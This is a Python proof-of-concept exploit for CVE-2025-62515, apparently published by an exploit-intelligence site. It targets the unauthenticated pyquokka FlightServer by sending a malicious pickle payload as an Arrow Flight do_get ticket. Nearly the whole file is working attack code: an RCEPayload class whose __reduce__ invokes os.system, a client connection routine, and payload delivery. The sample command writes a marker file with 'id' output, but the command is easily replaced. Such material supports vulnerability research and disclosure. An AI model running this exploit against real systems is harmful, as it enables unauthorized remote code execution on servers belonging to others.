#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : pyquokka FlightServer — Pickle Deserialization RCE (do_get ticket)
# CVE            : CVE-2025-62515
# Vendor         : marsupialtail (pyquokka)
# Product        : pyquokka FlightServer
# Affected       : All versions through 0.3.2 (UNPATCHED)
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.8 (CRITICAL)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-62515 — Vector 3: do_get Ticket Deserialization RCE

Demonstrates the pickle.loads() RCE vulnerability through a THIRD code path:
the do_get() method which deserializes the Flight ticket (flight.py line 98).

This is a DIFFERENT entry point than do_action() — it uses the Flight protocol's
ticket mechanism instead of the action mechanism.

ATTACK CHAIN:
  1. Connect to FlightServer on gRPC port 5005 (no auth required)
  2. Send do_get(Ticket(<malicious_pickle_payload>))
  3. Server calls pickle.loads(ticket.ticket) at line 98
  4. pickle __reduce__() triggers os.system() — RCE achieved

PREREQUISITES:
  - pyarrow (client-side only): pip install pyarrow

REFERENCES:
  - CVE-2025-62515
  - https://github.com/marsupialtail/quokka/security/advisories/GHSA-f74j-gffq-vm9p
"""

import sys
import pickle
import os

import pyarrow.flight


class RCEPayload:
    """Malicious pickle class — executes OS command via __reduce__ during deserialization."""
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return (os.system, (self.command,))


def exploit(target_host, target_port=5005):
    """
    Exploit CVE-2025-62515 via the do_get ticket deserialization.

    The do_get() method calls:
        mode, actor_id, channel_id, input_requirements, exact, sorted_reqs = pickle.loads(ticket.ticket)
    at line 98. The ticket bytes are entirely attacker-controlled.

    RCE fires during pickle.loads() before the tuple unpacking, so the
    same malicious payload works regardless of the expected data structure.
    """

    target_uri = f"grpc://{target_host}:{target_port}"
    marker_file = "/tmp/cve-2025-62515-vector3"

    print(f"[*] CVE-2025-62515 PoC — Vector 3: do_get ticket deserialization")
    print(f"[*] Target: {target_uri}")
    print()

    # Step 1: Connect to the Flight server
    print(f"[+] Connecting to FlightServer at {target_uri}...")
    try:
        client = pyarrow.flight.connect(target_uri)
        actions = list(client.list_actions())
        print(f"[+] Connected! Server has {len(actions)} actions")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)

    # Step 2: Craft RCE payload
    # The payload targets the do_get path which is a different FlightServer method.
    # Instead of sending an Action, we send a Ticket (do_get request).
    rce_command = (
        f"echo 'Vector: do_get ticket (line 98)' > {marker_file} && "
        f"id >> {marker_file} && "
        f"echo 'CVE-2025-62515 RCE via do_get ticket' >> {marker_file}"
    )

    payload = RCEPayload(rce_command)
    malicious_bytes = pickle.dumps(payload)

    print(f"[+] Crafted malicious pickle payload ({len(malicious_bytes)} bytes)")
    print()

    # Step 3: Send as a Flight ticket via do_get
    # In Apache Arrow Flight, do_get() takes a Ticket object.
    # The server unpickles ticket.ticket at line 98 — the entire ticket
    # content is passed directly to pickle.loads().
    print(f"[+] Sending malicious do_get request with pickle payload in ticket...")

    ticket = pyarrow.flight.Ticket(malicious_bytes)

    try:
        reader = client.do_get(ticket)
        # Try to consume the stream (unlikely to succeed after RCE)
        for batch in reader:
            pass
        print(f"[+] do_get completed (unexpected)")
    except pyarrow.flight.FlightServerError as e:
        # Expected: after pickle.loads() fires RCE, the returned int cannot
        # be unpacked as a 6-tuple, causing a ValueError.
        # The gRPC framework catches this and returns an error.
        print(f"[+] Server returned error (EXPECTED — RCE already executed):")
        error_msg = str(e)
        if len(error_msg) > 200:
            error_msg = error_msg[:200] + "..."
        print(f"    {error_msg}")
    except Exception as e:
        # Other errors (e.g., connection-level) might indicate the RCE still fired
        print(f"[!] Error (RCE may have still executed): {type(e).__name__}: {e}")

    print()
    print(f"[*] Exploit delivered via do_get ticket vector.")
    print(f"[*] Verify: docker exec <container> cat {marker_file}")

    return marker_file


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5005

    exploit(target, port)
